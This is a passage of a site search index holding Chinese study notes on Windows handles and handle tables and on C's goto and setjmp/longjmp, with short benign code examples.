</ol>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#handle","title":"\u516b\u3001\u53e5\u67c4\uff08handle\uff09","text":"<p>Windows\u662f\u4e00\u4e2a\u4ee5\u865a\u62df\u5185\u5b58\u4e3a\u57fa\u7840\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5f88\u591a\u65f6\u5019\uff0c\u8fdb\u7a0b\u7684\u4ee3\u7801\u548c\u6570\u636e\u5e76\u4e0d\u5168\u90e8\u88c5\u5165\u5185\u5b58\uff0c\u8fdb\u7a0b\u7684\u67d0\u4e00\u6bb5\u88c5\u5165\u5185\u5b58\u540e\uff0c\u8fd8\u53ef\u80fd\u88ab\u6362\u51fa\u5230\u5916\u5b58\uff0c\u5f53\u518d\u6b21\u9700\u8981\u65f6\uff0c\u518d\u88c5\u5165\u5185\u5b58\u3002\u4e24\u6b21\u88c5\u5165\u7684\u5730\u5740\u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u662f\u4e0d\u4e00\u6837\u7684\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u540c\u4e00\u5bf9\u8c61\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u4f1a\u53d8\u5316\u3002\uff08\u5bf9\u4e8e\u865a\u62df\u5185\u5b58\u4e0d\u662f\u5f88\u4e86\u89e3\u7684\u8bfb\u8005\uff0c\u53ef\u4ee5\u53c2\u8003\u6709\u5173\u64cd\u4f5c\u7cfb\u7edf\u65b9\u9762\u7684\u4e66\u7c4d\uff09\u90a3\u4e48\uff0c\u7a0b\u5e8f\u600e\u4e48\u624d\u80fd\u51c6\u786e\u5730\u8bbf\u95ee\u5230\u5bf9\u8c61\u5462\uff1f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cWindows\u5f15\u5165\u4e86\u53e5\u67c4\u3002</p> <p>\u7cfb\u7edf\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u5728\u5185\u5b58\u4e2d\u5206\u914d\u4e00\u5b9a\u7684\u533a\u57df\uff0c\u7528\u6765\u5b58\u653e\u5404\u4e2a\u53e5\u67c4\uff0c\u5373\u4e00\u4e2a\u4e2a32\u4f4d\u65e0\u7b26\u53f7\u6574\u578b\u503c\uff0832\u4f4d\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff09\u3002\u6bcf\u4e2a32\u4f4d\u65e0\u7b26\u53f7\u6574\u578b\u503c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411\u5185\u5b58\u4e2d\u7684\u53e6\u4e00\u4e2a\u533a\u57df\uff08\u6211\u4eec\u4e0d\u59a8\u79f0\u4e4b\u4e3a\u533a\u57dfA\uff09\u3002\u800c\u533a\u57dfA\u4e2d\u5b58\u653e\u7684\u6b63\u662f\u5bf9\u8c61\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u3002\u5f53\u5bf9\u8c61\u5728\u5185\u5b58\u4e2d\u7684\u4f4d\u7f6e\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u533a\u57dfA\u7684\u503c\u88ab\u66f4\u65b0\uff0c\u53d8\u4e3a\u5f53\u524d\u65f6\u523b\u5bf9\u8c61\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\uff0c\u800c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u533a\u57dfA\u7684\u4f4d\u7f6e\u4ee5\u53ca\u5bf9\u5e94\u53e5\u67c4\u7684\u503c\u662f\u4e0d\u53d1\u751f\u53d8\u5316\u7684\u3002\u8fd9\u79cd\u673a\u5236\uff0c\u7528\u4e00\u79cd\u5f62\u8c61\u7684\u8bf4\u6cd5\u53ef\u4ee5\u8868\u8ff0\u4e3a\uff1a\u6709\u4e00\u4e2a\u56fa\u5b9a\u7684\u5730\u5740\uff08\u53e5\u67c4\uff09\uff0c\u6307\u5411\u4e00\u4e2a\u56fa\u5b9a\u7684\u4f4d\u7f6e\uff08\u533a\u57dfA\uff09\uff0c\u800c\u533a\u57dfA\u4e2d\u7684\u503c\u53ef\u4ee5\u52a8\u6001\u5730\u53d8\u5316\uff0c\u5b83\u65f6\u523b\u8bb0\u5f55\u7740\u5f53\u524d\u65f6\u523b\u5bf9\u8c61\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u3002\u8fd9\u6837\uff0c\u65e0\u8bba\u5bf9\u8c61\u7684\u4f4d\u7f6e\u5728\u5185\u5b58\u4e2d\u5982\u4f55\u53d8\u5316\uff0c\u53ea\u8981\u6211\u4eec\u638c\u63e1\u4e86\u53e5\u67c4\u7684\u503c\uff0c\u5c31\u53ef\u4ee5\u627e\u5230\u533a\u57dfA\uff0c\u8fdb\u800c\u627e\u5230\u8be5\u5bf9\u8c61\u3002\u800c\u53e5\u67c4\u7684\u503c\u5728\u7a0b\u5e8f\u672c\u6b21\u8fd0\u884c\u671f\u95f4\u662f\u7edd\u5bf9\u4e0d\u53d8\u7684\uff0c\u6211\u4eec\uff08\u5373\u7cfb\u7edf\uff09\u5f53\u7136\u53ef\u4ee5\u638c\u63e1\u5b83\u3002\u8fd9\u5c31\u662f\u4ee5\u4e0d\u53d8\u5e94\u4e07\u53d8\uff0c\u6309\u56fe\u7d22\u9aa5\uff0c\u987a\u85e4\u6478\u74dc\u3002</p> <p>\u5176\u5b9e\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u64cd\u4f5c\u7cfb\u7edf\u7684\u5c01\u88c5\u4e0b\uff0c\u53e5\u67c4\u5c31\u50cf\u662f\u4e00\u4e2a\u6570\u7ec4\u7684\u7d22\u5f15\uff0c\u4f60\u53ea\u9700\u8981\u77e5\u9053\u7d22\u5f15\u5373\u53ef\uff0c\u5177\u4f53\u7684\u5185\u5bb9\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5e2e\u4f60\u5b8c\u6210\u3002</p> <p>\u53e5\u67c4\u8fd8\u6709\u4e00\u4e2a\u4f5c\u7528\uff0c\u5c31\u662f\u5c01\u88c5\u3002\u6bd4\u5982window\u7a97\u53e3\u7684\u53e5\u67c4\uff0c\u4ed6\u53ea\u7ed9\u4f60\u4e00\u4e2a\u957f\u957f\u7684\u6570\uff0c\u800c\u5177\u4f53\u7684\u5185\u5bb9\u4f60\u770b\u4e0d\u5230\uff0c\u4f46\u662f\u4f60\u53ef\u4ee5\u64cd\u4f5c\u4ed6\u3002\u8fd9\u662f\u4e3a\u4e86\u9632\u6b62\u7528\u6237\u6076\u610f\u7be1\u6539\u7cfb\u7edf\u8d44\u6e90\u548c\u914d\u7f6e\uff0c\u6bd4\u5982<code>stdin</code>\u4f5c\u4e3a\u6807\u51c6\u8f93\u5165\u662f\u516c\u5f00\u7684\uff0c\u5e26\u5f0f\u5982\u679c\u4ed6\u628a\u91cc\u9762\u7684\u6240\u6709\u5185\u5bb9\u66b4\u9732\u51fa\u6765\uff0c\u5c82\u4e0d\u662f\u5f88\u5371\u9669\uff0c\u56e0\u6b64\u53ea\u7559\u4e0b\u4e00\u4e2a\u53e5\u67c4\u4e2a\u5916\u9762\uff0c\u901a\u8fc7\u53e5\u67c4\u627e\u64cd\u4f5c\u7cfb\u7edf\u53bb\u5b8c\u6210\u64cd\u4f5c\u3002\u8fd9\u6837\u53ef\u4ee5\u6709\u6548\u7684\u9632\u6b62\u6076\u610f\u4ee3\u7801\uff08\u90a3\u79cd\u76f4\u63a5\u5371\u5bb3\u5e95\u5c42\u7684\u64cd\u4f5c\uff09\u3002</p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u7406\u89e3Windows\u53e5\u67c4\uff1a</p> <p>\u6570\u503c\u4e0a\uff0c\u662f\u4e00\u4e2a32\u4f4d\u65e0\u7b26\u53f7\u6574\u578b\u503c\uff0832\u4f4d\u7cfb\u7edf\u4e0b\uff09\uff1b\u903b\u8f91\u4e0a\uff0c\u76f8\u5f53\u4e8e\u6307\u9488\u7684\u6307\u9488\uff1b\u5f62\u8c61\u7406\u89e3\u4e0a\uff0c\u662fWindows\u4e2d\u5404\u4e2a\u5bf9\u8c61\u7684\u4e00\u4e2a\u552f\u4e00\u7684\u3001\u56fa\u5b9a\u4e0d\u53d8\u7684ID\uff1b\u4f5c\u7528\u4e0a\uff0cWindows\u4f7f\u7528\u53e5\u67c4\u6765\u6807\u8bc6\u8bf8\u5982\u7a97\u53e3\u3001\u4f4d\u56fe\u3001\u753b\u7b14\u7b49\u5bf9\u8c61\uff0c\u5e76\u901a\u8fc7\u53e5\u67c4\u627e\u5230\u8fd9\u4e9b\u5bf9\u8c61\u3002</p> <p>\u968f\u4fbf\u5728\u8fd9\u91cc\u63d0\u4e00\u4e0b\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u53e5\u67c4\u90fd\u662f\u516c\u5f00\u7684\uff0c\u5c31\u76f8\u5f53\u4e8e\u516c\u5171\u8d44\u6e90\uff0c\u8fd9\u4e5f\u5c31\u662f\u4e3a\u4f55\u75c5\u6bd2\u53ef\u4ee5\u8ba9\u4f60\u7684\u7a97\u53e3\u6216\u8005\u684c\u9762\u201c\u8df3\u821e\u201d\u3002</p> <p>c\u8bed\u8a00\u4e2d\u7684\u53ef\u4ee5\u5b9e\u73b0goto\u7684\u529f\u80fd\uff0c\u4f46\u662f\u8fdc\u8fdc\u4e0d\u662fgoto\uff1b <p>\u9996\u5148\u6211\u4eec\u6765\u590d\u4e60\u4e00\u4e0bgoto\u8bed\u53e5\u5427</p>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#_6","title":"\u4e5d\u3001\u53e5\u67c4\u548c\u53e5\u67c4\u8868","text":"<p>\u8fd9\u91cc\u6211\u4eec\u8981\u8ba8\u8bba\u7684\u662f\u53e5\u67c4\u548c\u53e5\u67c4\u8868\uff0c\u4ee5\u53ca\u53e5\u67c4\u6240\u6307\u5411\u7684\u5185\u6838\u5bf9\u8c61\uff0c\u5f53\u7136\u4e0d\u662f\u8ba8\u8bba\u4ed6\u4eec\u7684\u5185\u5bb9\u662f\u600e\u6837\u7684\uff0c\u800c\u662f\u8fd9\u4e9b\u673a\u5236\u662f\u5982\u4f55\u5b9e\u73b0\u5185\u6838\u4fdd\u62a4\u7684\u3002</p>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#_7","title":"\u53e5\u67c4","text":"<p>\u53e5\u67c4\u7684\u5f15\u5165</p> <p>\u53e5\u67c4\u7a76\u7adf\u662f\u4ec0\u4e48\uff0c\u4e3a\u4ec0\u4e48\u8981\u7528\u53e5\u67c4\uff1f</p> <p>\u6211\u4eec\u5728Windows\u7f16\u7a0b\u65f6\uff0c\u4ece\u4e8b\u4f1a\u4f7f\u7528\u5230\u7a97\u53e3\u53e5\u67c4\uff0c\u4e5f\u77e5\u9053\u53ef\u4ee5\u901a\u8fc7\u53e5\u67c4\u5b8c\u6210\u5bf9\u7a97\u53e3\u7684\u64cd\u4f5c\uff0c\u65e0\u8bba\u662f\u81ea\u5df1\u7684\u7a97\u53e3\u8fd8\u662f\u522b\u4eba\u7684\u7a97\u53e3\u3002\u5f53\u6211\u4eec\u60f3\u770b\u770b\u53e5\u67c4\u7a76\u7adf\u662f\u5565\u7684\u65f6\u5019\uff0c\u6211\u4eec\u53d1\u73b0\u4ed6\u5728\u90a3\u91cc\u9762\u53ea\u662f\u4e00\u4e2a\u6570\u5b57\u3002</p> <pre><code>struct HWND__\n{ int unused; }\ntypedef struct HWND__ *HWND;\n//\u5728c\u8bed\u8a00\u7684\u6838\u5fc3\u4ee3\u7801\u91cc\u9762\u5f53\u7136\u4e0d\u4f1a\u8fd9\u6837\u76f4\u63a5\u5b9a\u4e49\uff0c\u8fd9\u662f\u7b14\u8005\u901a\u8fc7\u5b8f\u66ff\u6362\u5f97\u6765\u7684\u7b80\u5316\u7248\n//\u4ee5\u4e0a\u662fhandle of windows \u7684\u5b9a\u4e49\uff0c\u4ece\u540d\u5b57\u4e0a\u770b\u5c31\u662fWindows\u7a97\u53e3\u7684\u53e5\u67c4\u3002\n//\u63a5\u4e0b\u6765\u662fhandle\u5728c\u8bed\u8a00\u7684\u5b9a\u4e49\ntypedef void *HANDLE;\n//\u4ed6\u7adf\u7136\u662f\u4e00\u4e2a\u6ca1\u6709\u7c7b\u578b\u7684\u6307\u9488\uff0c\u90a3\u4ed6\u5728\u4f7f\u7528\u7684\u65f6\u5019\u7a76\u7adf\u4f1a\u6307\u5411\u54ea\u91cc\u5462\uff1f\n</code></pre> <p>\u8fd9\u5c31\u5f88\u5947\u602a\u4e86\uff0c<code>handle</code>\u662f\u4e00\u4e2a\u65e0\u7c7b\u578b\u6307\u9488\uff0c\u800c<code>hwnd</code>\u662f\u4e00\u4e2a\u542b\u6709int\u7c7b\u578b\u6570\u636e\u7684\u7ed3\u6784\u4f53\u3002\u96be\u9053\u4e0d\u5e94\u8be5\u662f\u540c\u4e00\u4e2a\u5417\uff1f</p> <p>\u53e5\u67c4</p> <p>\u4e0a\u9762\u7684\u95ee\u9898\u60f3\u4e86\u5f88\u4e45\uff0c\u4f46\u662f\u8fd8\u662f\u627e\u4e0d\u5230\u7b54\u6848\uff0c\u4e8e\u662f\u7ecf\u8fc7\u767e\u5ea6\u5f97\u77e5\uff0c\u53e5\u67c4\u672c\u8d28\u4e0a\u53ea\u662f\u4e00\u4e2a\u7d22\u5f15\u3002\u65e0\u8bba\u4ed6\u662f\u4e00\u4e2a\u6570\u8fd8\u662f\u4e00\u4e2a\u7a7a\u6307\u9488\uff0c\u4ed6\u90fd\u662f32\u4f4d\u7684\u4e00\u4e2a\u6570\u636e\uff0c\u800c\u8fd9\u4e2a\u6570\u636e\u5c31\u662f\u4e00\u4e2a\u7d22\u5f15\uff0c\u5bf9\u5e94\u7740\u4e00\u4e2a\u5185\u6838\u5bf9\u8c61\u3002</p> <p>\u6ce8\u610f\uff1a\u5982\u679c\u662f\u6307\u9488\uff0c\u5e76\u4e0d\u662f\u8bf4\u4ed6\u76f4\u63a5\u6307\u5411\u5185\u6838\u5bf9\u8c61\uff0c\u800c\u662f\u4e00\u4e2a\u7d22\u5f15\u3002\u65e0\u8bba\u662f\u6570\u8fd8\u662f\u6307\u9488\uff0c\u4ed6\u4eec\u90fd\u4e0d\u76f4\u63a5\u6307\u5411\u4e00\u4e2a\u5185\u6838\u5bf9\u8c61\u3002\u800c\u662f\u5728\u53e5\u67c4\u5217\u8868\u4e2d\u7528\u6765\u6620\u5c04\u7684\u3002</p> <p>\u968f\u4fbf\u8865\u5145\u4e00\u4e0b\uff0c\u53e5\u67c4\u7684\u4f5c\u7528\u4e0d\u4ec5\u4ec5\u662f\u4e3a\u4e86\u4fdd\u62a4\u5185\u6838\uff0c\u8fd8\u6709\u4fdd\u8bc1\u8d44\u6e90\u80fd\u88ab\u627e\u5230\u3002\u6211\u4eec\u90fd\u77e5\u9053\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u4e0a\u5c42\u63d0\u4f9b\u7684\u670d\u52a1\u66f4\u613f\u610f\u662f\u900f\u660e\u7684\uff0c\u6362\u8a00\u4e4b\uff0c\u5c31\u662f\u7cfb\u7edf\u66f4\u559c\u6b22\u4f7f\u7528\u865a\u62df\u5730\u5740\u3002\u53ef\u662f\u7cfb\u7edf\u4e0b\u4e00\u5c42\u4f7f\u7528\u7684\u662f\u7269\u7406\u5730\u5740\u3002\u8fd9\u91cc\u5c31\u9700\u8981\u4e00\u4e2a\u4e00\u4e00\u5bf9\u5e94\u5173\u7cfb\u3002\u56e0\u6b64\u4f7f\u7528\u53e5\u67c4\u6765\u5b8c\u6210\u5bf9\u4e0d\u5b9a\u8d44\u6e90\u7684\u4f7f\u7528</p>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#_8","title":"\u53e5\u67c4\u5217\u8868","text":"<p>\u4e0a\u9762\u63d0\u5230\u53e5\u67c4\u662f\u7528\u6765\u6307\u5411\u53e5\u67c4\u5217\u8868\u4e2d\u7684\u6620\u5c04\u7684\u3002\u800c\u4e3a\u4e86\u4fdd\u62a4\u5185\u6838\uff0c\u6620\u5c04\u5173\u7cfb\u662f\u900f\u660e\u7684\uff0c\u4e5f\u5c31\u662f\u53ea\u6709\u7cfb\u7edf\u81ea\u5df1\u77e5\u9053\u3002</p> <p>\u90a3\u4e48\u8fd9\u4e2a\u53e5\u67c4\u5217\u8868\u662f\u5728\u54ea\u91cc\u5462\uff1f\u4ed6\u7684\u7ed3\u6784\u6709\u4e8b\u5982\u4f55\u5462\uff1f\u4ed6\u6709\u4ec0\u4e48\u89c4\u5219\u5462\uff1f</p>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#_9","title":"\u53e5\u67c4\u5217\u8868\u7684\u4f4d\u7f6e","text":"<p>\u53e5\u67c4\u5217\u8868\u662f\u6bcf\u4e2a\u8fdb\u7a0b\u81ea\u5df1\u79c1\u6709\u7684\u3002\u6bcf\u4e2a\u8fdb\u7a0b\u5728\u521b\u7acb\u4e4b\u521d\u90fd\u4f1a\u5728\u5806\u4e2d\u6709\u4e00\u5757\u5185\u5b58\u7528\u6765\u5b58\u653e\u8fd9\u4e2a\u53e5\u67c4\u5217\u8868\u3002\u6bcf\u4e00\u4e2a\u8fdb\u7a0b\u7684\u53e5\u67c4\u5217\u8868\u91cc\u9762\u7684\u503c\u90fd\u662f\u72ec\u7acb\u4e14\u552f\u4e00\u7684\u3002</p> <p>\u4f8b\u5982\u6709\u4e00\u4e2a\u5185\u6838\u5bf9\u8c61OUTPUT\u90a3\u4e48\u5f53A\u8fdb\u7a0b\u9700\u8981\u4f7f\u7528OUTPUT\u65f6\uff0c\u7cfb\u7edf\u5c31\u4f1a\u8fd4\u56de\u4e2a\u4ed6\u4e00\u4e2a\u53e5\u67c4\uff0c\u5b58\u653e\u5728\u53e5\u67c4\u8868\u4e2d\uff0c\u5f53B\u8fdb\u7a0b\u4e5f\u8981\u4f7f\u7528OUTPUT\u65f6\uff0c\u7cfb\u7edf\u4e5f\u4f1a\u8fd4\u4e00\u4e2a\u53e5\u67c4\uff0c\u4f46\u662f\u8981\u6ce8\u610f\uff0c\u8fd9\u4e24\u4e2a\u53e5\u67c4\u662f\u4e0d\u4e00\u6837\u7684\u3002\u53e5\u67c4\u5728\u6574\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90fd\u662f\u552f\u4e00\u7684\u3002\u56e0\u6b64\u53e5\u67c4\u8d44\u6e90\u662f\u6709\u9650\u7684\u3002\u7533\u8bf7\u4e86\u592a\u591a\u53e5\u67c4\uff0c\u7cfb\u7edf\u662f\u4f1a\u5d29\u6e83\u7684\u3002\u4f46\u662f\u4e00\u822c\u7cfb\u7edf\u90fd\u4f1a\u5bf9\u6b64\u505a\u51fa\u9650\u5236\uff0c\u4fdd\u62a4\u7cfb\u7edf\u3002</p> <p>\u5176\u5b9e\u4e0a\u9762\u8bb2\u7684\u8fd8\u662f\u6709\u4e0d\u4e25\u8c28\u4e4b\u521d\uff0c\u5177\u4f53\u53ef\u4ee5\u770b\u4e0b\u9762\u7684\uff1a</p> <ol> <li>\u8fdb\u7a0b\u7684\u53e5\u67c4\u8868\u662f\u79c1\u6709\u7684\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u6709\u4e00\u4e2a\u81ea\u5df1\u7684\u53e5\u67c4\u8868</li> <li>\u9664\u6b64\u4e4b\u5916\uff0c\u7cfb\u7edf\u8fd8\u6709\u4e00\u4e2a\u5168\u5c40\u53e5\u67c4\u8868\uff1a<code>PsdCidTable</code>\uff0c\u4e3a _HANDLE_TABLE \u7ed3\u6784\uff0c\u6240\u6709\u7684\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u65e0\u8bba\u65e0\u8bba\u662f\u5426\u6253\u5f00\uff0c\u90fd\u5728\u8fd9\u4e2a\u8868\u4e2d</li> <li>\u6bcf\u4e2a\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684\u7f16\u53f7\uff1aPID\u548cCID \u8fd9\u4e24\u4e2a\u503c\u5176\u5b9e\u5c31\u662f\u5168\u5c40\u53e5\u67c4\u8868\u4e2d\u7684\u7d22\u5f15</li> </ol>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#setjmph","title":"\u5341\u3001setjmp.h","text":""},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#goto","title":"goto\u8bed\u53e5","text":"<pre><code>#include &lt;stdio.h&gt;\nint main ()\n{\n    LOOP:\n    goto LOOP;//\u8df3\u8f6c\u5230LOOP\n    return 0;\n}\n/*\u8fd9\u662f\u4e2a\u6b7b\u5faa\u73af*/\n</code></pre> <p><code>goto</code>\u8bed\u53e5\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u65e0\u6761\u4ef6\u8df3\u8f6c\uff0c\u5728\u8ba1\u7b97\u673a\u5e95\u5c42\u6709\u76f8\u5e94\u7684\u6307\u4ee4\uff08jmp\u6307\u4ee4\uff09\u3002\u6267\u884c\u6548\u7387\u9ad8\uff0c\u4f46\u662f\u4ed6\u4f1a\u8ba9\u7a0b\u5e8f\u7684\u7ed3\u6784\u770b\u8d77\u6765\u5341\u5206\u6df7\u4e71\uff0c\u800c\u4e14\u53ea\u80fd\u5728\u51fd\u6570\u5185\u8fdb\u884c\u8df3\u8f6c\u3002\u6709\u4e00\u5b9a\u7684\u5c40\u9650\u6027\u3002</p>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#setjmp","title":"setjmp\u8bed\u53e5","text":"<p>setjmp.h\u662fC\u6807\u51c6\u51fd\u6570\u5e93\u4e2d\u63d0\u4f9b\u201c\u975e\u672c\u5730\u8df3\u8f6c\u201d\u7684\u5934\u6587\u4ef6\uff1a\u63a7\u5236\u6d41\u504f\u79bb\u4e86\u901a\u5e38\u7684\u5b50\u7a0b\u5e8f\u8c03\u7528\u4e0e\u8fd4\u56de\u5e8f\u5217\u3002\u4e92\u8865\u7684\u4e24\u4e2a\u51fd\u6570setjmp\u4e0elongjmp\u63d0\u4f9b\u4e86\u8fd9\u79cd\u529f\u80fd\u3002</p> <p>setjmp/longjmp\u7684\u5178\u578b\u7528\u9014\u662f\u5f02\u5e38\u5904\u7406\u673a\u5236\u7684\u5b9e\u73b0\uff1a\u5229\u7528longjmp\u6062\u590d\u7a0b\u5e8f\u6216\u7ebf\u7a0b\u7684\u72b6\u6001\uff0c\u751a\u81f3\u53ef\u4ee5\u8df3\u8fc7\u6808\u4e2d\u591a\u5c42\u7684\u51fd\u6570\u8c03\u7528\u3002</p> <p>\u2014\u2014\u2014\u2014wiki\u767e\u79d1</p> <code>int setjmp(jmp_buf env)</code> \u521b\u5efa\u672c\u5730\u7684<code>jmp_buf</code>\u7f13\u51b2\u533a\u5e76\u4e14\u521d\u59cb\u5316\uff0c\u7528\u4e8e\u5c06\u6765\u8df3\u8f6c\u56de\u6b64\u5904\u3002\u8fd9\u4e2a\u5b50\u7a0b\u5e8f[1] \u4fdd\u5b58\u7a0b\u5e8f\u7684\u8c03\u7528\u73af\u5883\u4e8e<code>env</code>\u53c2\u6570\u6240\u6307\u7684\u7f13\u51b2\u533a\uff0c<code>env</code>\u5c06\u88ab<code>longjmp</code>\u4f7f\u7528\u3002\u5982\u679c\u662f\u4ece<code>setjmp</code>\u76f4\u63a5\u8c03\u7528\u8fd4\u56de\uff0c<code>setjmp</code>\u8fd4\u56de\u503c\u4e3a0\u3002\u5982\u679c\u662f\u4ece<code>longjmp</code>\u6062\u590d\u7684\u7a0b\u5e8f\u8c03\u7528\u73af\u5883\u8fd4\u56de\uff0c<code>setjmp</code>\u8fd4\u56de\u975e\u96f6\u503c\u3002 <code>void longjmp(jmp_buf env, int value)</code> \u6062\u590d<code>env</code>\u6240\u6307\u7684\u7f13\u51b2\u533a\u4e2d\u7684\u7a0b\u5e8f\u8c03\u7528\u73af\u5883\u4e0a\u4e0b\u6587\uff0c<code>env</code>\u6240\u6307\u7f13\u51b2\u533a\u7684\u5185\u5bb9\u662f\u7531<code>setjmp</code>\u5b50\u7a0b\u5e8f[1]\u8c03\u7528\u6240\u4fdd\u5b58\u3002<code>value</code>\u7684\u503c\u4ece<code>longjmp</code>\u4f20\u9012\u7ed9<code>setjmp</code>\u3002<code>longjmp</code>\u5b8c\u6210\u540e\uff0c\u7a0b\u5e8f\u4ece\u5bf9\u5e94\u7684<code>setjmp</code>\u8c03\u7528\u5904\u7ee7\u7eed\u6267\u884c\uff0c\u5982\u540c<code>setjmp</code>\u8c03\u7528\u521a\u521a\u5b8c\u6210\u3002\u5982\u679c<code>value</code>\u4f20\u9012\u7ed9<code>longjmp</code>\u96f6\u503c\uff0c<code>setjmp</code>\u7684\u8fd4\u56de\u503c\u4e3a1\uff1b\u5426\u5219\uff0c<code>setjmp</code>\u7684\u8fd4\u56de\u503c\u4e3a<code>value</code>\u3002 <p><code>setjmp</code>\u4fdd\u5b58\u5f53\u524d\u7684\u73af\u5883\uff08\u5373\u7a0b\u5e8f\u7684\u72b6\u6001\uff09\u5230\u5e73\u53f0\u76f8\u5173\u7684\u4e00\u4e2a\u6570\u636e\u7ed3\u6784 (<code>jmp_buf</code>)\uff0c\u8be5\u6570\u636e\u7ed3\u6784\u5728\u968f\u540e\u7a0b\u5e8f\u6267\u884c\u7684\u67d0\u4e00\u70b9\u53ef\u88ab <code>longjmp</code>\u7528\u4e8e\u6062\u590d\u7a0b\u5e8f\u7684\u72b6\u6001\u5230<code>setjmp</code>\u8c03\u7528\u6240\u4fdd\u5b58\u5230<code>jmp_buf</code>\u65f6\u7684\u539f\u6837\u3002\u8fd9\u4e00\u8fc7\u7a0b\u53ef\u4ee5\u8ba4\u4e3a\u662f\"\u8df3\u8f6c\"\u56de<code>setjmp</code>\u6240\u4fdd\u5b58\u7684\u7a0b\u5e8f\u6267\u884c\u72b6\u6001\u3002<code>setjmp</code>\u7684\u8fd4\u56de\u503c\u6307\u51fa\u63a7\u5236\u662f\u6b63\u5e38\u5230\u8fbe\u8be5\u70b9\u8fd8\u662f\u901a\u8fc7\u8c03\u7528<code>longjmp</code>\u6062\u590d\u5230\u8be5\u70b9\u3002\u56e0\u6b64\u6709\u7f16\u7a0b\u7684\u60ef\u7528\u6cd5: `if( setjmp(x) ){/ handle longjmp(x) /}</p> <p>wiki\u90fd\u770b\u4e0d\u61c2\uff0c\u90a3\u5c31\u4e0a\u4ee3\u7801\u54af\uff01</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;setjmp.h&gt;\n\nstatic jmp_buf buf;\n\nvoid second(void) {\n    printf(\"second\\n\");         // \u6253\u5370\n    longjmp(buf,1);             // \u8df3\u56desetjmp\u7684\u8c03\u7528\u5904 - \u4f7f\u5f97setjmp\u8fd4\u56de\u503c\u4e3a1\n}\n\nvoid first(void) {\n    second();\n    printf(\"first\\n\");          // \u4e0d\u53ef\u80fd\u6267\u884c\u5230\u6b64\u884c\n}\n\nint main() {   \n    if ( ! setjmp(buf) ) {\n        first();                // \u8fdb\u5165\u6b64\u884c\u524d\uff0csetjmp\u8fd4\u56de0\n    } else {                    // \u5f53longjmp\u8df3\u8f6c\u56de\uff0csetjmp\u8fd4\u56de1\uff0c\u56e0\u6b64\u8fdb\u5165\u6b64\u884c\n        printf(\"main\\n\");       // \u6253\u5370\n    }\n\n    return 0;\n}\n\n/*\u8f93\u51fa\u7ed3\u679c\nsecond\nmain\n*/\n</code></pre> <p>\u8bb2\u4e00\u4e0b\u6211\u7684\u7406\u89e3\uff1a</p> <p>\u9996\u5148\u8fd9\u4e2asetjmp\u5c31\u662f\u4fdd\u5b58\u5f53\u524d\u7684\u8fd0\u884c\u73af\u5883\uff0c\u4e5f\u5c31\u662f\u4e00\u4e9b\u53d8\u91cf\u7684\u503c\u3002\u4ee5\u4fbf\u5728\u8df3\u8f6c\u56de\u6765\u65f6\u53ef\u4ee5\u76f4\u63a5\u7528\u3002\u8fd9\u91cc\u548c<code>goto</code>\u7684\u533a\u522b\u5c31\u5728\u4e8e:<code>goto</code>\u8bed\u53e5\u4e0d\u4f1a\u5c06\u8fd0\u884c\u72b6\u6001\u4fdd\u5b58\uff0c\u8df3\u8f6c\u540e\u76f4\u63a5\u4f7f\u7528\u4e4b\u524d\u7684\u73af\u5883\uff08\u8df3\u8f6c\u8bed\u53e5\u6240\u5728\u7684\u73af\u5883\uff09\uff0c\u800c\u4e14\u4e0d\u4f1a\u9000\u6808\uff1b\u800c<code>setjmp</code>\u4f1a\u5c06\u5f53\u524d\u72b6\u6001\u4fdd\u5b58\uff0c\u5e76\u4e14\u9000\u6808\u5904\u7406\u3002</p> 